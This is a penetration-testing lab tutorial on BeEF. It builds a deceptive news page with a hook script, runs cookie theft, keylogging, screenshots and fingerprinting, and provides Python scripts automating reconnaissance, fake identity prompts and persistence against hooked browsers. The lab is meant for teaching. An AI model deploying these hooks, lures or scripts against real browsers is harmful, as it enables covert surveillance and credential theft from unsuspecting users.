@@ -1,0 +1,784 @@
+ Hook Browsers with BeEF
+Objectives
+By the end of this lab, students will be able to:
+
+Install and configure BeEF (Browser Exploitation Framework) on a Linux system
+Understand the fundamentals of browser hooking and client-side exploitation
+Successfully hook target browsers using various techniques
+Execute malicious payloads through hooked browsers
+Automate browser exploitation tasks using Python scripts and BeEF's REST API
+Analyze and interpret exploitation results for penetration testing reports
+Prerequisites
+Before starting this lab, students should have:
+
+Basic understanding of web technologies (HTML, JavaScript, HTTP)
+Familiarity with Linux command line operations
+Knowledge of networking concepts (IP addresses, ports, protocols)
+Understanding of penetration testing methodologies
+Basic Python programming knowledge
+Awareness of ethical hacking principles and legal considerations
+Ready-to-Use Cloud Machines
+Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your dedicated environment. No need to build your own virtual machine or configure additional systems. All tools and dependencies are pre-installed and ready to use.
+
+Task 1: Set up BeEF for Browser Exploitation
+Subtask 1.1: Install BeEF Framework
+First, we need to install BeEF and its dependencies on our Linux system.
+
+# Update the system packages
+sudo apt update && sudo apt upgrade -y
+
+# Install required dependencies
+sudo apt install -y git ruby ruby-dev bundler sqlite3 libsqlite3-dev
+
+# Clone the BeEF repository
+cd /opt
+sudo git clone https://github.com/beefproject/beef.git
+
+# Change ownership to current user
+sudo chown -R $USER:$USER /opt/beef
+
+# Navigate to BeEF directory
+cd /opt/beef
+
+# Install Ruby gems
+bundle install
+Subtask 1.2: Configure BeEF Settings
+Now we'll configure BeEF with appropriate settings for our lab environment.
+
+# Copy the default configuration file
+cp config.yaml.example config.yaml
+
+# Edit the configuration file
+nano config.yaml
+Modify the following sections in the configuration file:
+
+beef:
+    version: '0.5.4.0'
+    debug: false
+    crypto_default_value_length: 80
+    
+    restrictions:
+        permitted_hooking_subnet: ["0.0.0.0/0"]
+        permitted_ui_subnet: ["0.0.0.0/0"]
+        
+    credentials:
+        user: "beef"
+        passwd: "beef123"
+        
+    http:
+        debug: false
+        host: "0.0.0.0"
+        port: "3000"
+        
+    https:
+        enable: false
+        
+    database:
+        driver: "sqlite"
+        db_file: "beef.db"
+Subtask 1.3: Start BeEF Framework
+Launch BeEF and verify it's running correctly.
+
+# Start BeEF
+cd /opt/beef
+./beef
+You should see output similar to:
+
+[*] BeEF is loading. Wait a few seconds...
+[*] 3 extensions enabled.
+[*] 2 network interfaces were detected.
+[*] running on network interface: 127.0.0.1
+[*] BeEF server started (press control+c to stop)
+[*] Web UI: http://127.0.0.1:3000/ui/panel
+[*] Hook: <script src="http://127.0.0.1:3000/hook.js"></script>
+Subtask 1.4: Access BeEF Web Interface
+Open a new terminal and access the BeEF web interface:
+
+# Get your machine's IP address
+ip addr show | grep inet
+
+# Open Firefox browser
+firefox http://localhost:3000/ui/panel &
+Log in using the credentials:
+
+Username: beef
+Password: beef123
+Task 2: Hook a Browser and Execute Malicious Payloads
+Subtask 2.1: Create a Malicious Web Page
+Create a simple HTML page that will hook browsers visiting it.
+
+# Create a directory for our malicious content
+mkdir -p /tmp/beef-lab
+cd /tmp/beef-lab
+
+# Create the malicious HTML page
+cat > malicious_page.html << 'EOF'
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Welcome to Our Site</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 40px;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .news {
+            margin: 20px 0;
+            padding: 15px;
+            background-color: #e8f4f8;
+            border-left: 4px solid #2196F3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Latest Technology News</h1>
+        <div class="news">
+            <h3>Breaking: New Security Vulnerability Discovered</h3>
+            <p>Security researchers have identified a critical vulnerability affecting millions of users worldwide. Click here to learn more about protecting your system.</p>
+        </div>
+        <div class="news">
+            <h3>Software Update Available</h3>
+            <p>Important security updates are now available for your browser. Please ensure your system is up to date.</p>
+        </div>
+        <p>Stay informed about the latest security threats and protection measures.</p>
+    </div>
+    
+    <!-- BeEF Hook - This is what makes the page malicious -->
+    <script src="http://localhost:3000/hook.js"></script>
+</body>
+</html>
+EOF
+Subtask 2.2: Serve the Malicious Page
+Set up a simple web server to serve our malicious page:
+
+# Start a simple HTTP server
+cd /tmp/beef-lab
+python3 -m http.server 8080 &
+
+# Note the process ID for later cleanup
+echo $! > /tmp/webserver.pid
+Subtask 2.3: Hook a Browser
+Now we'll simulate a victim browsing to our malicious page:
+
+# Open the malicious page in a new browser instance
+firefox http://localhost:8080/malicious_page.html &
+Important: In the BeEF web interface, you should now see a new hooked browser appear in the "Hooked Browsers" panel.
+
+Subtask 2.4: Execute Basic Payloads
+With a browser hooked, let's execute some basic payloads:
+
+Alert Dialog Payload:
+
+In BeEF interface, select the hooked browser
+Navigate to Commands → Social Engineering → Create Alert Dialog
+Configure the payload:
+Dialog Text: Your system may be at risk. Click OK to run security scan.
+Click Execute
+Redirect Browser Payload:
+
+Go to Commands → Browser → Redirect Browser
+Configure:
+Redirect URL: http://localhost:8080/malicious_page.html
+Click Execute
+Get Cookie Information:
+
+Navigate to Commands → Browser → Get Cookie
+Click Execute
+View results in the command history
+Subtask 2.5: Advanced Payload Execution
+Execute more sophisticated payloads:
+
+Fingerprint Browser:
+
+Go to Commands → Host → Get System Info
+Click Execute
+Review the gathered system information
+Capture Screenshots:
+
+Navigate to Commands → Misc → Take Screenshot
+Click Execute
+View the captured screenshot
+Keylogger:
+
+Go to Commands → Input → Keylogger
+Click Execute
+Type something in the hooked browser to test
+Task 3: Automate Browser Exploitation Tasks Using Python and BeEF
+Subtask 3.1: Set Up BeEF REST API
+First, enable the REST API in BeEF configuration:
+
+# Stop BeEF if running (Ctrl+C in BeEF terminal)
+# Edit the configuration file
+cd /opt/beef
+nano config.yaml
+Add the following REST API configuration:
+
+extension:
+    restfulapi:
+        enable: true
+        key: "beef_api_key_2023"
+Restart BeEF:
+
+./beef
+Subtask 3.2: Create Python Automation Script
+Create a Python script to automate BeEF operations:
+
+cd /tmp/beef-lab
+cat > beef_automation.py << 'EOF'
+#!/usr/bin/env python3
+
+import requests
+import json
+import time
+import sys
+
+class BeEFAutomation:
+    def __init__(self, beef_host="localhost", beef_port="3000", api_key="beef_api_key_2023"):
+        self.base_url = f"http://{beef_host}:{beef_port}/api"
+        self.api_key = api_key
+        self.token = None
+        self.session = requests.Session()
+        
+    def authenticate(self, username="beef", password="beef123"):
+        """Authenticate with BeEF and get session token"""
+        auth_data = {
+            "username": username,
+            "password": password
+        }
+        
+        try:
+            response = self.session.post(
+                f"{self.base_url}/admin/login",
+                json=auth_data,
+                headers={"Content-Type": "application/json"}
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                self.token = result.get("token")
+                print(f"[+] Authentication successful. Token: {self.token[:20]}...")
+                return True
+            else:
+                print(f"[-] Authentication failed: {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Authentication error: {str(e)}")
+            return False
+    
+    def get_hooked_browsers(self):
+        """Get list of hooked browsers"""
+        if not self.token:
+            print("[-] Not authenticated")
+            return []
+            
+        try:
+            response = self.session.get(
+                f"{self.base_url}/hooks",
+                params={"token": self.token}
+            )
+            
+            if response.status_code == 200:
+                hooks = response.json()
+                print(f"[+] Found {len(hooks['hooked-browsers'])} hooked browsers")
+                return hooks['hooked-browsers']
+            else:
+                print(f"[-] Failed to get hooks: {response.status_code}")
+                return []
+                
+        except Exception as e:
+            print(f"[-] Error getting hooks: {str(e)}")
+            return []
+    
+    def execute_command(self, hook_id, module_id, command_data=None):
+        """Execute a command on a hooked browser"""
+        if not self.token:
+            print("[-] Not authenticated")
+            return False
+            
+        if command_data is None:
+            command_data = {}
+            
+        payload = {
+            "token": self.token,
+            "command_module_id": module_id,
+            **command_data
+        }
+        
+        try:
+            response = self.session.post(
+                f"{self.base_url}/modules/{hook_id}/{module_id}",
+                json=payload,
+                headers={"Content-Type": "application/json"}
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                print(f"[+] Command executed successfully: {module_id}")
+                return result
+            else:
+                print(f"[-] Command execution failed: {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Command execution error: {str(e)}")
+            return False
+    
+    def get_command_results(self, hook_id, command_id):
+        """Get results of executed command"""
+        if not self.token:
+            print("[-] Not authenticated")
+            return None
+            
+        try:
+            response = self.session.get(
+                f"{self.base_url}/modules/{hook_id}/{command_id}",
+                params={"token": self.token}
+            )
+            
+            if response.status_code == 200:
+                return response.json()
+            else:
+                print(f"[-] Failed to get command results: {response.status_code}")
+                return None
+                
+        except Exception as e:
+            print(f"[-] Error getting command results: {str(e)}")
+            return None
+    
+    def automated_exploitation(self):
+        """Perform automated exploitation sequence"""
+        print("[*] Starting automated exploitation sequence...")
+        
+        # Get hooked browsers
+        hooks = self.get_hooked_browsers()
+        if not hooks:
+            print("[-] No hooked browsers found")
+            return
+        
+        for hook_session in hooks:
+            hook_id = hook_session
+            print(f"[*] Exploiting hook: {hook_id}")
+            
+            # Execute alert dialog
+            print("[*] Executing alert dialog...")
+            self.execute_command(hook_id, "social_engineering/create_alert_dialog", {
+                "text": "Automated exploitation in progress..."
+            })
+            
+            time.sleep(2)
+            
+            # Get browser information
+            print("[*] Gathering browser information...")
+            self.execute_command(hook_id, "browser/get_browser_info")
+            
+            time.sleep(2)
+            
+            # Get system information
+            print("[*] Gathering system information...")
+            self.execute_command(hook_id, "host/get_system_info")
+            
+            time.sleep(2)
+            
+            print(f"[+] Exploitation sequence completed for hook: {hook_id}")
+
+def main():
+    print("BeEF Automation Script")
+    print("=" * 50)
+    
+    # Initialize BeEF automation
+    beef = BeEFAutomation()
+    
+    # Authenticate
+    if not beef.authenticate():
+        print("[-] Failed to authenticate with BeEF")
+        sys.exit(1)
+    
+    # Wait for user to hook a browser
+    print("\n[*] Please ensure you have a browser hooked before continuing...")
+    input("Press Enter when ready to proceed...")
+    
+    # Run automated exploitation
+    beef.automated_exploitation()
+    
+    print("\n[+] Automation completed!")
+
+if __name__ == "__main__":
+    main()
+EOF
+
+# Make the script executable
+chmod +x beef_automation.py
+Subtask 3.3: Install Required Python Libraries
+Install the necessary Python libraries:
+
+# Install requests library
+pip3 install requests
+Subtask 3.4: Run the Automation Script
+Execute the Python automation script:
+
+# Ensure BeEF is running and you have a hooked browser
+python3 beef_automation.py
+Subtask 3.5: Create Advanced Automation Script
+Create a more sophisticated automation script with additional features:
+
+cat > advanced_beef_automation.py << 'EOF'
+#!/usr/bin/env python3
+
+import requests
+import json
+import time
+import sys
+import argparse
+from datetime import datetime
+
+class AdvancedBeEFAutomation:
+    def __init__(self, beef_host="localhost", beef_port="3000", api_key="beef_api_key_2023"):
+        self.base_url = f"http://{beef_host}:{beef_port}/api"
+        self.api_key = api_key
+        self.token = None
+        self.session = requests.Session()
+        self.results = []
+        
+    def authenticate(self, username="beef", password="beef123"):
+        """Authenticate with BeEF and get session token"""
+        auth_data = {
+            "username": username,
+            "password": password
+        }
+        
+        try:
+            response = self.session.post(
+                f"{self.base_url}/admin/login",
+                json=auth_data,
+                headers={"Content-Type": "application/json"}
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                self.token = result.get("token")
+                print(f"[+] Authentication successful at {datetime.now()}")
+                return True
+            else:
+                print(f"[-] Authentication failed: {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Authentication error: {str(e)}")
+            return False
+    
+    def reconnaissance_phase(self, hook_id):
+        """Perform reconnaissance on hooked browser"""
+        print(f"[*] Starting reconnaissance phase for hook: {hook_id}")
+        
+        recon_commands = [
+            ("browser/get_browser_info", "Browser Information"),
+            ("host/get_system_info", "System Information"),
+            ("network/get_local_ip", "Local IP Address"),
+            ("browser/get_cookie", "Cookie Information"),
+            ("browser/get_page_html", "Page HTML Content")
+        ]
+        
+        for command, description in recon_commands:
+            print(f"[*] Gathering: {description}")
+            result = self.execute_command(hook_id, command)
+            if result:
+                self.results.append({
+                    "hook_id": hook_id,
+                    "command": command,
+                    "description": description,
+                    "timestamp": datetime.now().isoformat(),
+                    "result": result
+                })
+            time.sleep(1)
+    
+    def social_engineering_phase(self, hook_id):
+        """Perform social engineering attacks"""
+        print(f"[*] Starting social engineering phase for hook: {hook_id}")
+        
+        # Create fake notification
+        self.execute_command(hook_id, "social_engineering/create_alert_dialog", {
+            "text": "Security Alert: Your session will expire in 5 minutes. Please save your work."
+        })
+        
+        time.sleep(3)
+        
+        # Create fake login prompt
+        self.execute_command(hook_id, "social_engineering/fake_notification_bar", {
+            "notification_text": "Please verify your identity to continue"
+        })
+        
+        time.sleep(2)
+    
+    def persistence_phase(self, hook_id):
+        """Establish persistence mechanisms"""
+        print(f"[*] Starting persistence phase for hook: {hook_id}")
+        
+        # Create invisible iframe for persistence
+        self.execute_command(hook_id, "persistence/create_invisible_iframe", {
+            "url": "http://localhost:3000/hook.js"
+        })
+        
+        # Set up periodic callback
+        self.execute_command(hook_id, "persistence/man_in_the_browser", {
+            "url_pattern": "*",
+            "callback_url": "http://localhost:3000/hook.js"
+        })
+    
+    def execute_command(self, hook_id, module_id, command_data=None):
+        """Execute a command on a hooked browser"""
+        if not self.token:
+            print("[-] Not authenticated")
+            return False
+            
+        if command_data is None:
+            command_data = {}
+            
+        payload = {
+            "token": self.token,
+            "command_module_id": module_id,
+            **command_data
+        }
+        
+        try:
+            response = self.session.post(
+                f"{self.base_url}/modules/{hook_id}/{module_id}",
+                json=payload,
+                headers={"Content-Type": "application/json"}
+            )
+            
+            if response.status_code == 200:
+                result = response.json()
+                print(f"[+] Command executed: {module_id}")
+                return result
+            else:
+                print(f"[-] Command failed: {response.status_code}")
+                return False
+                
+        except Exception as e:
+            print(f"[-] Command error: {str(e)}")
+            return False
+    
+    def generate_report(self):
+        """Generate exploitation report"""
+        report_file = f"/tmp/beef_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
+        
+        report_data = {
+            "timestamp": datetime.now().isoformat(),
+            "total_commands": len(self.results),
+            "results": self.results
+        }
+        
+        with open(report_file, 'w') as f:
+            json.dump(report_data, f, indent=2)
+        
+        print(f"[+] Report generated: {report_file}")
+        return report_file
+    
+    def full_exploitation_campaign(self):
+        """Run complete exploitation campaign"""
+        print("[*] Starting full exploitation campaign...")
+        
+        # Get hooked browsers
+        response = self.session.get(
+            f"{self.base_url}/hooks",
+            params={"token": self.token}
+        )
+        
+        if response.status_code != 200:
+            print("[-] Failed to get hooked browsers")
+            return
+        
+        hooks = response.json()['hooked-browsers']
+        
+        if not hooks:
+            print("[-] No hooked browsers found")
+            return
+        
+        for hook_id in hooks:
+            print(f"\n[*] Exploiting hook: {hook_id}")
+            
+            # Phase 1: Reconnaissance
+            self.reconnaissance_phase(hook_id)
+            
+            # Phase 2: Social Engineering
+            self.social_engineering_phase(hook_id)
+            
+            # Phase 3: Persistence
+            self.persistence_phase(hook_id)
+            
+            print(f"[+] Exploitation completed for hook: {hook_id}")
+        
+        # Generate report
+        self.generate_report()
+
+def main():
+    parser = argparse.ArgumentParser(description="Advanced BeEF Automation Tool")
+    parser.add_argument("--host", default="localhost", help="BeEF host")
+    parser.add_argument("--port", default="3000", help="BeEF port")
+    parser.add_argument("--username", default="beef", help="BeEF username")
+    parser.add_argument("--password", default="beef123", help="BeEF password")
+    
+    args = parser.parse_args()
+    
+    print("Advanced BeEF Automation Tool")
+    print("=" * 50)
+    
+    # Initialize automation
+    beef = AdvancedBeEFAutomation(args.host, args.port)
+    
+    # Authenticate
+    if not beef.authenticate(args.username, args.password):
+        print("[-] Authentication failed")
+        sys.exit(1)
+    
+    # Wait for hooked browsers
+    print("\n[*] Ensure browsers are hooked before proceeding...")
+    input("Press Enter to start exploitation campaign...")
+    
+    # Run campaign
+    beef.full_exploitation_campaign()
+    
+    print("\n[+] Campaign completed successfully!")
+
+if __name__ == "__main__":
+    main()
+EOF
+
+chmod +x advanced_beef_automation.py
+Subtask 3.6: Execute Advanced Automation
+Run the advanced automation script:
+
+# Run with default settings
+python3 advanced_beef_automation.py
+
+# Or run with custom parameters
+python3 advanced_beef_automation.py --host localhost --port 3000 --username beef --password beef123
+Verification and Testing
+Verify BeEF Installation
+Check that BeEF is properly installed and configured:
+
+# Check BeEF directory
+ls -la /opt/beef/
+
+# Verify configuration file
+cat /opt/beef/config.yaml | grep -A 5 "credentials"
+
+# Check if BeEF process is running
+ps aux | grep beef
+Verify Browser Hooking
+Confirm that browsers are successfully hooked:
+
+Check BeEF web interface for hooked browsers
+Verify command execution in browser
+Review command history and results
+Test Automation Scripts
+Validate that Python automation scripts work correctly:
+
+# Test basic script
+python3 -c "import requests; print('Requests library working')"
+
+# Check script permissions
+ls -la beef_automation.py advanced_beef_automation.py
+
+# Verify report generation
+ls -la /tmp/beef_report_*.json
+Troubleshooting
+Common Issues and Solutions
+Issue 1: BeEF fails to start
+
+# Check Ruby version
+ruby --version
+
+# Reinstall gems
+cd /opt/beef
+bundle install --force
+Issue 2: Browser not getting hooked
+
+# Check if hook.js is accessible
+curl http://localhost:3000/hook.js
+
+# Verify firewall settings
+sudo ufw status
+Issue 3: Python script authentication fails
+
+# Check BeEF credentials
+grep -A 3 "credentials:" /opt/beef/config.yaml
+
+# Test manual authentication
+curl -X POST http://localhost:3000/api/admin/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"beef","password":"beef123"}'
+Issue 4: Commands not executing
+
+# Check BeEF logs
+tail -f /opt/beef/beef.log
+
+# Verify hook is active
+curl http://localhost:3000/api/hooks?token=YOUR_TOKEN
+Security Considerations
+Ethical Usage Guidelines
+Only use BeEF in authorized environments
+Obtain proper written permission before testing
+Document all activities for compliance
+Protect sensitive data discovered during testing
+Follow responsible disclosure practices
+Legal Compliance
+Ensure testing is within scope of engagement
+Maintain detailed logs of all activities
+Respect privacy and data protection laws
+Report findings through proper channels
+Cleanup
+Clean up the lab environment:
+
+# Stop BeEF
+pkill -f beef
+
+# Stop web server
+kill $(cat /tmp/webserver.pid)
+
+# Remove temporary files
+rm -rf /tmp/beef-lab/
+rm -f /tmp/webserver.pid
+rm -f /tmp/beef_report_*.json
+
+# Close browser instances
+pkill firefox
+Conclusion
+In this comprehensive lab, you have successfully learned how to set up and use BeEF (Browser Exploitation Framework) for browser hooking and client-side exploitation. You accomplished the following key objectives:
+
+Technical Skills Developed:
+
+Installed and configured BeEF framework on Linux
+Created malicious web pages with embedded hooks
+Successfully hooked target browsers and maintained persistent access
+Executed various payloads including information gathering, social engineering, and persistence mechanisms
+Developed Python automation scripts to streamline exploitation processes
+Integrated with BeEF's REST API for programmatic control
+Security Testing Capabilities:
+
+Understanding of client-side attack vectors and browser vulnerabilities
+Practical experience with social engineering techniques through browser manipulation
+Knowledge of persistence mechanisms in web-based attacks
+Ability to automate complex exploitation workflows
+Skills in generating comprehensive penetration testing reports
+Real-World Applications: This lab provides essential skills for offensive web application penetration testing, particularly relevant for:
+
+Red Team Operations: Simulating advanced persistent threats through browser exploitation
+Security Assessments: Identifying client-side vulnerabilities in web applications
+Awareness Training: Demonstrating real-world attack scenarios to educate users
+Incident Response: Understanding attacker techniques for better defense strategies
+The automation capabilities you developed using Python and BeEF's API are particularly valuable for scaling testing efforts and ensuring consistent, repeatable results in professional penetration testing engagements. These skills directly support certification objectives for offensive web application security testing and provide practical experience with industry-standard tools and techniques.
+
+Remember to always use these skills ethically and within the bounds of authorized testing engagements, maintaining the highest standards of professional conduct in cybersecurity practice.
